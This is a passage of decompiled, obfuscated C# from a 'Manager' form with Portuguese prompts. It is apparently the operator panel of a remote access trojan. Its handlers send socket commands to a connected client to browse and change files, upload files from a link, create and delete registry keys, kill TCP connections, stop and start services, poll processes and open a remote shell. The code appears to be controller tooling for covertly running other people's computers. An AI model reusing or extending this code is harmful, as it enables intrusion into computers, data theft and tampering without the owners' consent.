								up.FN = (text + "\\" + new FileInfo(text2).Name).Replace("\\\\", "\\");
								up.Name = this.sk.ip() + Class6.smethod_14(ref up.FN);
								up.osk = this.sk;
								up.SZ = (int)FileSystem.FileLen(up.TMP);
								up.Text = new FileInfo(up.TMP).Name + " >> " + up.FN;
								up.Show();
							}
							num3++;
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000286 RID: 646 RVA: 0x001F0034 File Offset: 0x001EE434
		private void NewEmptyFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Nome do Arquivo?", "Novo Arquivo", "Novo Texto", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client client = this.sk;
				string[] array = new string[7];
				array[0] = "Ex";
				array[1] = Class7.string_1;
				array[2] = "fm";
				array[3] = Class7.string_1;
				array[4] = "nf";
				array[5] = Class7.string_1;
				string[] array2 = array;
				int num = 6;
				string text2 = this.TextBox1.Text + text;
				array2[num] = Class6.smethod_14(ref text2);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x06000287 RID: 647 RVA: 0x001F00D8 File Offset: 0x001EE4D8
		private void NewFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Nome da Pasta?", "Nova Pasta", "Nova Pasta", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client client = this.sk;
				string[] array = new string[7];
				array[0] = "Ex";
				array[1] = Class7.string_1;
				array[2] = "fm";
				array[3] = Class7.string_1;
				array[4] = "nd";
				array[5] = Class7.string_1;
				string[] array2 = array;
				int num = 6;
				string text2 = this.TextBox1.Text + text;
				array2[num] = Class6.smethod_14(ref text2);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x06000288 RID: 648 RVA: 0x001F017C File Offset: 0x001EE57C
		private void OpenDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = !Directory.Exists(this.string_0);
			if (flag)
			{
				Directory.CreateDirectory(this.string_0);
			}
			try
			{
				Process.Start(this.string_0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000289 RID: 649 RVA: 0x001F01DC File Offset: 0x001EE5DC
		private void RarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rar",
					Class7.string_1
				});
				string text2 = Interaction.InputBox("Digite o Nome do Rar", string.Empty, new DirectoryInfo(this.TextBox1.Text).Name + ".rar", -1, -1);
				flag = (Operators.CompareString(text2, string.Empty, false) != 0);
				if (flag)
				{
					TextBox textBox = this.TextBox1;
					string text3 = textBox.Text;
					textBox.Text = text3;
					text = string.Concat(new string[]
					{
						text,
						Class6.smethod_14(ref text2),
						Class7.string_1,
						Class6.smethod_14(ref text3),
						Class7.string_1
					});
					string str = "a -y \"" + text2 + "\"";
					try
					{
						foreach (object obj in this.L2.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							str = str + " \"" + listViewItem.Text + "\"";
						}
					}
					finally
					{
						IEnumerator enumerator;
						flag = (enumerator is IDisposable);
						if (flag)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					text += Class6.smethod_14(ref str);
					this.sk.Send(text);
				}
			}
		}

		// Token: 0x0600028A RID: 650 RVA: 0x001F03A4 File Offset: 0x001EE7A4
		private void UnRarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				string toolTipText = listViewItem.ToolTipText;
				listViewItem.ToolTipText = toolTipText;
				string s = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"unrar",
					Class7.string_1
				}) + Class6.smethod_14(ref toolTipText);
				this.sk.Send(s);
			}
		}

		// Token: 0x0600028B RID: 651 RVA: 0x001F0450 File Offset: 0x001EE850
		private void UploadFromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.TextBox1.Text, string.Empty, false) != 0;
			if (flag)
			{
				FromLink fromLink = new FromLink();
				fromLink.ShowDialog(this);
				flag = fromLink.IsOK;
				if (flag)
				{
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "fl";
					array[5] = Class7.string_1;
					TextBox textBox = fromLink.TextBox1;
					string text = textBox.Text;
					textBox.Text = text;
					array[6] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					string[] array2 = array;
					int num = 8;
					string text2 = this.TextBox1.Text + fromLink.TextBox2.Text;
					array2[num] = Class6.smethod_14(ref text2);
					this.sk.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x0600028C RID: 652 RVA: 0x001F0548 File Offset: 0x001EE948
		private void RGk_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				bool isExpanded = e.Node.IsExpanded;
				if (isExpanded)
				{
					e.Node.Collapse();
				}
				else
				{
					e.Node.Expand();
				}
			}
		}

		// Token: 0x0600028D RID: 653 RVA: 0x001F0594 File Offset: 0x001EE994
		private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.ListView1.SelectedItems.Count != 0;
				if (flag)
				{
					this.cur = (Manager.CR)this.ListView1.SelectedIndices[0];
					switch (this.cur)
					{
					case Manager.CR.fm:
						this.FMM.BringToFront();
						this.LPR.SendToBack();
						this.LTCP.SendToBack();
						this.RG.SendToBack();
						this.RG.SendToBack();
						this.sh.SendToBack();
						this.LSRV.SendToBack();
						this.L2.method_3();
						break;
					case Manager.CR.PR:
						this.LPR.BringToFront();
						this.LPR.method_3();
						break;
					case Manager.CR.tcp:
						this.LTCP.BringToFront();
						this.LTCP.method_3();
						break;
					case Manager.CR.reg:
						this.RG.BringToFront();
						break;
					case Manager.CR.shl:
						this.sh.BringToFront();
						flag = (this.shStarted == 0);
						if (flag)
						{
							this.shStarted = 1;
							this.sk.Send(string.Concat(new string[]
							{
								"Ex",
								Class7.string_1,
								"rs",
								Class7.string_1,
								"~"
							}));
						}
						break;
					case Manager.CR.srv:
						this.LSRV.BringToFront();
						this.LSRV.method_3();
						break;
					}
					this.Icon = Icon.FromHandle(((Bitmap)this.vmethod_148.Images[this.ListView1.SelectedItems[0].ImageIndex]).GetHicon());
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600028E RID: 654 RVA: 0x001F07C8 File Offset: 0x001EEBC8
		private void KillConnectionToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"tcp",
				Class7.string_1,
				"!"
			});
			bool flag = this.LTCP.SelectedItems.Count != 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.LTCP.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Tag.ToString();
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x0600028F RID: 655 RVA: 0x001F08B4 File Offset: 0x001EECB4
		private void RefreshToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"fm",
				Class7.string_1,
				"~"
			}));
		}

		// Token: 0x06000290 RID: 656 RVA: 0x001F090C File Offset: 0x001EED0C
		private void CreateKeyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null && this.RGk.SelectedNode.FullPath.Contains("\\");
			if (flag)
			{
				string text = Interaction.InputBox("Nome da Chave?", "Criar Nova Chave", "Nome", -1, -1);
				flag = (text.Length != 0);
				if (flag)
				{
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"#",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\",
						Class7.string_1,
						text
					}));
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						this.RGk.SelectedNode.FullPath,
						"\\"
					}));
				}
			}
		}

		// Token: 0x06000291 RID: 657 RVA: 0x001F0A80 File Offset: 0x001EEE80
		private void DeleteSelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				string fullPath = this.RGk.SelectedNode.FullPath;
				flag = fullPath.Contains("\\");
				if (flag)
				{
					string text = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 1];
					string text2 = string.Empty;
					int num = Strings.Split(fullPath, "\\", -1, CompareMethod.Binary).Length - 2;
					for (int i = 0; i <= num; i++)
					{
						text2 = text2 + Strings.Split(fullPath, "\\", -1, CompareMethod.Binary)[i] + "\\";
					}
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"$",
						Class7.string_1,
						text2,
						Class7.string_1,
						text
					}));
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						text,
						"\\"
					}));
				}
			}
		}

		// Token: 0x06000292 RID: 658 RVA: 0x001F0C2C File Offset: 0x001EF02C
		private void StopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"!",
					text
				}));
			}
		}

		// Token: 0x06000293 RID: 659 RVA: 0x001F0D1C File Offset: 0x001EF11C
		private void PauseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"@",
					text
				}));
			}
		}

		// Token: 0x06000294 RID: 660 RVA: 0x001F0E0C File Offset: 0x001EF20C
		private void StartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.LSRV.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Empty;
				try
				{
					foreach (object obj in this.LSRV.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						text = text + Class7.string_1 + listViewItem.Text;
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"srv",
					Class7.string_1,
					"#",
					text
				}));
			}
		}

		// Token: 0x06000295 RID: 661 RVA: 0x001F0EFC File Offset: 0x001EF2FC
		private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rd"
				});
				try
				{
					foreach (object obj in this.L2.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						flag = (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0);
						if (flag)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + Class7.string_1 + Class6.smethod_14(ref toolTipText);
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000296 RID: 662 RVA: 0x001F1024 File Offset: 0x001EF424
		private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.RGk.Enabled = false;
				this.RGLIST.Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
			}
		}

		// Token: 0x06000297 RID: 663 RVA: 0x001F10D4 File Offset: 0x001EF4D4
		private void vmethod_26_Tick(object sender, EventArgs e)
		{
			this.vmethod_26.Enabled = false;
			bool flag = this.sk == null;
			if (flag)
			{
				this.Close();
			}
			else
			{
				flag = !this.sk.CN;
				if (flag)
				{
					this.Close();
				}
				else
				{
					try
					{
						switch (this.cur)
						{
						case Manager.CR.PR:
							this.vmethod_26.Interval = 2000;
							flag = !this.PRNXT;
							if (!flag)
							{
								IEnumerator enumerator = this.LPR.Items.GetEnumerator();
								string text = string.Empty;
								for (;;)
								{
									flag = enumerator.MoveNext();
									if (!flag)
									{
										break;
									}
									ListViewItem listViewItem = (ListViewItem)enumerator.Current;
									flag = (listViewItem != null);
									if (flag)
									{
										text = text + Class7.string_1 + listViewItem.SubItems[1].Text;
									}
								}
								this.sk.Send(string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"proc",
									Class7.string_1,
									"U",
									text
								}));
								this.PRNXT = false;
							}
							break;
						case Manager.CR.tcp:
							this.vmethod_26.Interval = 2000;
							flag = this.TCPNXT;
							if (flag)
							{
								string text2 = string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"tcp",
									Class7.string_1,
									"~",
									Class7.string_1
								});
								try
								{
									foreach (object obj in this.LTCP.Items)
									{
										ListViewItem listViewItem2 = (ListViewItem)obj;
										text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1;
									}
								}
								finally
								{
									IEnumerator enumerator2;
									flag = (enumerator2 is IDisposable);
									if (flag)
									{
										(enumerator2 as IDisposable).Dispose();
									}
								}
								this.sk.Send(text2);
								this.TCPNXT = false;
							}
							break;
						case Manager.CR.srv:
							this.vmethod_26.Interval = 4000;
							flag = this.srvNxt;
							if (flag)
							{
								string s = string.Concat(new string[]
								{
									"Ex",
									Class7.string_1,
									"srv",
									Class7.string_1,
									"~"
								});
								this.sk.Send(s);
								this.srvNxt = false;
							}
							break;
						}
					}
					catch (Exception ex)
					{
					}
					this.vmethod_26.Enabled = true;
				}
			}
		}

		// Token: 0x06000298 RID: 664 RVA: 0x001F1430 File Offset: 0x001EF830
		private void L1_DoubleClick1(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedItems.Count != 0;
			if (flag)
			{
				this.exp(this.L1.SelectedItems[0].ToolTipText, false);
			}
		}

		// Token: 0x040000C6 RID: 198
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000C8 RID: 200
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x040000C9 RID: 201
		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		// Token: 0x040000CA RID: 202
		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar _pr;

		// Token: 0x040000CB RID: 203
		[AccessedThroughProperty("M1")]
		private ContextMenuStrip _M1;

		// Token: 0x040000CC RID: 204
		[AccessedThroughProperty("KillToolStripMenuItem1")]
		private ToolStripMenuItem _KillToolStripMenuItem1;

		// Token: 0x040000CD RID: 205
		[AccessedThroughProperty("KillDeleteToolStripMenuItem")]
		private ToolStripMenuItem _KillDeleteToolStripMenuItem;

		// Token: 0x040000CE RID: 206
		[AccessedThroughProperty("RestartProcessToolStripMenuItem")]
		private ToolStripMenuItem _RestartProcessToolStripMenuItem;

		// Token: 0x040000CF RID: 207
		[AccessedThroughProperty("vmethod_26")]
		private Timer _vmethod_26;

		// Token: 0x040000D0 RID: 208
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x040000D1 RID: 209
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x040000D2 RID: 210
		[AccessedThroughProperty("KillConnectionToolStripMenuItem")]
		private ToolStripMenuItem _KillConnectionToolStripMenuItem;

		// Token: 0x040000D3 RID: 211
		[AccessedThroughProperty("crg")]
		private ContextMenuStrip _crg;

		// Token: 0x040000D4 RID: 212
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		// Token: 0x040000D5 RID: 213
		[AccessedThroughProperty("EditToolStripMenuItem")]
		private ToolStripMenuItem _EditToolStripMenuItem;

		// Token: 0x040000D6 RID: 214
		[AccessedThroughProperty("NewValueToolStripMenuItem")]
		private ToolStripMenuItem _NewValueToolStripMenuItem;

		// Token: 0x040000D7 RID: 215
		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem _DeleteToolStripMenuItem;

		// Token: 0x040000D8 RID: 216
		[AccessedThroughProperty("rimg")]
		private ImageList _rimg;

		// Token: 0x040000D9 RID: 217
		[AccessedThroughProperty("crgk")]
		private ContextMenuStrip _crgk;

		// Token: 0x040000DA RID: 218
		[AccessedThroughProperty("RefreshToolStripMenuItem1")]
		private ToolStripMenuItem _RefreshToolStripMenuItem1;

		// Token: 0x040000DB RID: 219
		[AccessedThroughProperty("CreateKeyToolStripMenuItem")]
		private ToolStripMenuItem _CreateKeyToolStripMenuItem;

		// Token: 0x040000DC RID: 220
		[AccessedThroughProperty("DeleteSelectedToolStripMenuItem")]
		private ToolStripMenuItem _DeleteSelectedToolStripMenuItem;

		// Token: 0x040000DD RID: 221
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x040000DE RID: 222
		[AccessedThroughProperty("StopToolStripMenuItem")]
		private ToolStripMenuItem _StopToolStripMenuItem;

		// Token: 0x040000DF RID: 223
		[AccessedThroughProperty("PauseToolStripMenuItem")]
		private ToolStripMenuItem _PauseToolStripMenuItem;

		// Token: 0x040000E0 RID: 224
		[AccessedThroughProperty("StartToolStripMenuItem")]
		private ToolStripMenuItem _StartToolStripMenuItem;

		// Token: 0x040000E1 RID: 225
		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip _ContextMenuStrip3;

		// Token: 0x040000E2 RID: 226
		[AccessedThroughProperty("UPToolStripMenuItem")]
		private ToolStripMenuItem _UPToolStripMenuItem;

		// Token: 0x040000E3 RID: 227
		[AccessedThroughProperty("RefreshToolStripMenuItem2")]
		private ToolStripMenuItem _RefreshToolStripMenuItem2;

		// Token: 0x040000E4 RID: 228
		[AccessedThroughProperty("RunToolStripMenuItem")]
		private ToolStripMenuItem _RunToolStripMenuItem;

		// Token: 0x040000E5 RID: 229
		[AccessedThroughProperty("DeleteToolStripMenuItem1")]
		private ToolStripMenuItem _DeleteToolStripMenuItem1;

		// Token: 0x040000E6 RID: 230
		[AccessedThroughProperty("EditToolStripMenuItem1")]
		private ToolStripMenuItem _EditToolStripMenuItem1;

		// Token: 0x040000E7 RID: 231
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		// Token: 0x040000E8 RID: 232
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x040000E9 RID: 233
		[AccessedThroughProperty("CutToolStripMenuItem")]
		private ToolStripMenuItem _CutToolStripMenuItem;

		// Token: 0x040000EA RID: 234
		[AccessedThroughProperty("PasteToolStripMenuItem")]
		private ToolStripMenuItem _PasteToolStripMenuItem;

		// Token: 0x040000EB RID: 235
		[AccessedThroughProperty("DownloadToolStripMenuItem")]
		private ToolStripMenuItem _DownloadToolStripMenuItem;

		// Token: 0x040000EC RID: 236
		[AccessedThroughProperty("UploadToolStripMenuItem")]
		private ToolStripMenuItem _UploadToolStripMenuItem;

		// Token: 0x040000ED RID: 237
		[AccessedThroughProperty("NewEmptyFileToolStripMenuItem")]
		private ToolStripMenuItem _NewEmptyFileToolStripMenuItem;

		// Token: 0x040000EE RID: 238
		[AccessedThroughProperty("NewFolderToolStripMenuItem")]
		private ToolStripMenuItem _NewFolderToolStripMenuItem;

		// Token: 0x040000EF RID: 239
		[AccessedThroughProperty("OpenDownloadsToolStripMenuItem")]
		private ToolStripMenuItem _OpenDownloadsToolStripMenuItem;

		// Token: 0x040000F0 RID: 240
		[AccessedThroughProperty("RarToolStripMenuItem")]
		private ToolStripMenuItem _RarToolStripMenuItem;

		// Token: 0x040000F1 RID: 241
		[AccessedThroughProperty("UnRarToolStripMenuItem")]
		private ToolStripMenuItem _UnRarToolStripMenuItem;

		// Token: 0x040000F2 RID: 242
		[AccessedThroughProperty("UploadFromLinkToolStripMenuItem")]
		private ToolStripMenuItem _UploadFromLinkToolStripMenuItem;

		// Token: 0x040000F3 RID: 243
		[AccessedThroughProperty("ContextMenuStrip4")]
		private ContextMenuStrip _ContextMenuStrip4;

		// Token: 0x040000F4 RID: 244
		[AccessedThroughProperty("RefreshToolStripMenuItem3")]
		private ToolStripMenuItem _RefreshToolStripMenuItem3;

		// Token: 0x040000F5 RID: 245
		[AccessedThroughProperty("MG")]
		private ImageList _MG;

		// Token: 0x040000F6 RID: 246
		[AccessedThroughProperty("ListView1")]
		private ListView _ListView1;

		// Token: 0x040000F7 RID: 247
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x040000F8 RID: 248
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x040000F9 RID: 249
		[AccessedThroughProperty("vmethod_148")]
		private ImageList _vmethod_148;

		// Token: 0x040000FA RID: 250
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x040000FB RID: 251
		[AccessedThroughProperty("FMM")]
		private Panel _FMM;

		// Token: 0x040000FC RID: 252
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040000FD RID: 253
		[AccessedThroughProperty("L1")]
		private GClass9 _L1;

		// Token: 0x040000FE RID: 254
		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		// Token: 0x040000FF RID: 255
		[AccessedThroughProperty("ColumnHeader7")]
		private ColumnHeader _ColumnHeader7;

		// Token: 0x04000100 RID: 256
		[AccessedThroughProperty("p")]
		private PictureBox _p;

		// Token: 0x04000101 RID: 257
		[AccessedThroughProperty("L2")]
		private GClass9 _L2;

		// Token: 0x04000102 RID: 258
		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader _ColumnHeader8;

		// Token: 0x04000103 RID: 259
		[AccessedThroughProperty("ColumnHeader9")]
		private ColumnHeader _ColumnHeader9;

		// Token: 0x04000104 RID: 260
		[AccessedThroughProperty("ColumnHeader10")]
		private ColumnHeader _ColumnHeader10;

		// Token: 0x04000105 RID: 261
		[AccessedThroughProperty("LTCP")]
		private GClass9 _LTCP;

		// Token: 0x04000106 RID: 262
		[AccessedThroughProperty("ColumnHeader16")]
		private ColumnHeader _ColumnHeader16;

		// Token: 0x04000107 RID: 263
		[AccessedThroughProperty("ColumnHeader17")]
		private ColumnHeader _ColumnHeader17;

		// Token: 0x04000108 RID: 264
		[AccessedThroughProperty("ColumnHeader18")]
		private ColumnHeader _ColumnHeader18;

		// Token: 0x04000109 RID: 265
		[AccessedThroughProperty("ColumnHeader19")]
		private ColumnHeader _ColumnHeader19;

		// Token: 0x0400010A RID: 266
		[AccessedThroughProperty("ColumnHeader20")]
		private ColumnHeader _ColumnHeader20;

		// Token: 0x0400010B RID: 267
		[AccessedThroughProperty("ColumnHeader21")]
		private ColumnHeader _ColumnHeader21;

		// Token: 0x0400010C RID: 268
		[AccessedThroughProperty("RG")]
		private Panel _RG;

		// Token: 0x0400010D RID: 269
		[AccessedThroughProperty("RGLIST")]
		private GClass9 _RGLIST;

		// Token: 0x0400010E RID: 270
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x0400010F RID: 271
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x04000110 RID: 272
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x04000111 RID: 273
		[AccessedThroughProperty("RGk")]
		private TreeView _RGk;

		// Token: 0x04000112 RID: 274
		[AccessedThroughProperty("sh")]
		private Panel _sh;

		// Token: 0x04000113 RID: 275
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000114 RID: 276
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x04000115 RID: 277
		[AccessedThroughProperty("LPR")]
		private GClass9 _LPR;

		// Token: 0x04000116 RID: 278
		[AccessedThroughProperty("ColumnHeader22")]
		private ColumnHeader _ColumnHeader22;

		// Token: 0x04000117 RID: 279
		[AccessedThroughProperty("ColumnHeader23")]
		private ColumnHeader _ColumnHeader23;

		// Token: 0x04000118 RID: 280
		[AccessedThroughProperty("ColumnHeader24")]
		private ColumnHeader _ColumnHeader24;

		// Token: 0x04000119 RID: 281
		[AccessedThroughProperty("ColumnHeader25")]
		private ColumnHeader _ColumnHeader25;

		// Token: 0x0400011A RID: 282
		[AccessedThroughProperty("ColumnHeader26")]
		private ColumnHeader _ColumnHeader26;

		// Token: 0x0400011B RID: 283
		[AccessedThroughProperty("LSRV")]
		private GClass9 _LSRV;

		// Token: 0x0400011C RID: 284
		[AccessedThroughProperty("ColumnHeader11")]
		private ColumnHeader _ColumnHeader11;

		// Token: 0x0400011D RID: 285
		[AccessedThroughProperty("ColumnHeader12")]
		private ColumnHeader _ColumnHeader12;

		// Token: 0x0400011E RID: 286
		[AccessedThroughProperty("ColumnHeader13")]
		private ColumnHeader _ColumnHeader13;

		// Token: 0x0400011F RID: 287
		[AccessedThroughProperty("ColumnHeader14")]
		private ColumnHeader _ColumnHeader14;

		// Token: 0x04000120 RID: 288
		[AccessedThroughProperty("ColumnHeader15")]
		private ColumnHeader _ColumnHeader15;

		// Token: 0x04000121 RID: 289
		[AccessedThroughProperty("vmethod_108")]
		private ImageList _vmethod_108;

		// Token: 0x04000122 RID: 290
		public Collection Cache;

		// Token: 0x04000123 RID: 291
		public Manager.CR cur;

		// Token: 0x04000124 RID: 292
		public string Flist;

		// Token: 0x04000125 RID: 293
		public Collection Images;

		// Token: 0x04000126 RID: 294
		private int int_0;

		// Token: 0x04000127 RID: 295
		private int int_1;

		// Token: 0x04000128 RID: 296
		public bool isCut;

		// Token: 0x04000129 RID: 297
		public int PID;

		// Token: 0x0400012A RID: 298
		public bool PRFX;

		// Token: 0x0400012B RID: 299
		public bool PRNXT;

		// Token: 0x0400012C RID: 300
		public Collection RGCH;

		// Token: 0x0400012D RID: 301
		public int shStarted;

		// Token: 0x0400012E RID: 302
		public Client sk;

		// Token: 0x0400012F RID: 303
		public bool SrvFX;

		// Token: 0x04000130 RID: 304
		public bool srvNxt;

		// Token: 0x04000131 RID: 305
		private string string_0;

		// Token: 0x04000132 RID: 306
		private string[] string_1;

		// Token: 0x04000133 RID: 307
		public bool TCPFX;

		// Token: 0x04000134 RID: 308
		public bool TCPNXT;

		// Token: 0x02000013 RID: 19
		public enum CR
		{
			// Token: 0x04000136 RID: 310
			fm,
			// Token: 0x04000137 RID: 311
			PR,
			// Token: 0x04000138 RID: 312
			reg = 3,
			// Token: 0x04000139 RID: 313
			shl,
			// Token: 0x0400013A RID: 314
			srv,
			// Token: 0x0400013B RID: 315
			tcp = 2
		}

		// Token: 0x02000014 RID: 20
		public sealed class GClass13
		{
			// Token: 0x06000299 RID: 665 RVA: 0x001F1478 File Offset: 0x001EF878
			public GClass13()
			{
				this.list_0 = new List<string[]>();
				this.list_1 = new List<string>();
			}

			// Token: 0x0400013C RID: 316
			public List<string[]> list_0;

			// Token: 0x0400013D RID: 317
			public List<string> list_1;

			// Token: 0x0400013E RID: 318
			public string string_0;
		}

		// Token: 0x02000015 RID: 21
		public sealed class GClass14
		{
			// Token: 0x0600029A RID: 666 RVA: 0x001F1498 File Offset: 0x001EF898
			public GClass14()
			{
				this.list_0 = new List<string>();
				this.list_1 = new List<string>();
			}

			// Token: 0x0400013F RID: 319
			public List<string> list_0;

			// Token: 0x04000140 RID: 320
			public List<string> list_1;

			// Token: 0x04000141 RID: 321
			public string string_0;
		}
	}
}
